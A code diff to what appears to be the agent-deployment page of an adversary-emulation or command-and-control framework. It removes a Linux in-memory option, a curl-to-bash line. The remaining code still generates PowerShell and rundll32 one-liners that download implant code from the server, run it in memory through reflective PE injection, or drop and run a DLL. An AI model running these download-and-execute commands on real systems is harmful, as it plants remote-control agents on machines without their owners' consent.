@@ -34,7 +34,6 @@
                                 <option disabled="disabled" selected>Select target OS</option>
                                 <option value="darwin">MacOS</option>
                                 <option value="linux">Linux</option>
-                                <option value="linux-mem">Linux (In-Memory)</option>
                                 <option value="windows-psh">Windows (PowerShell)</option>
                                 <option value="windows-cmd">Windows (CMD)</option>
                                 <option value="windows-dll-mem">Windows DLL (In-Memory)</option>
@@ -90,9 +89,7 @@
  				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $wc.Headers.add("defaultSleep","60"); $wc.Headers.add("defaultGroup","my_group"); $PEBytes = $wc.DownloadData($url); $wc1 = New-Object System.net.webclient; $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1"); IEX ($wc1.DownloadString($url)); Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId');
   			} else if(selected_option === 'windows-dll-disk') {
   				x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); while($true) {try {if(($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and -not ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.dll",$data)) -and -not (rundll32.exe C:\\Users\\Public\\$name.dll,VoidFunc)) {break}} catch{sleep 60}}');
-  			} else if(selected_option === 'linux-mem') {
-                x.text('curl -s -H "file:sandcat-inmem.sh" '+loc+'/file/download | SC_PROC_NAME=bin SC_DEFAULTSERVER='+loc+' SC_DEFAULTGROUP="my_group" bash');
-              }
+  			}
             $('#copyCommand').show();
         }
         function openDuk1(){
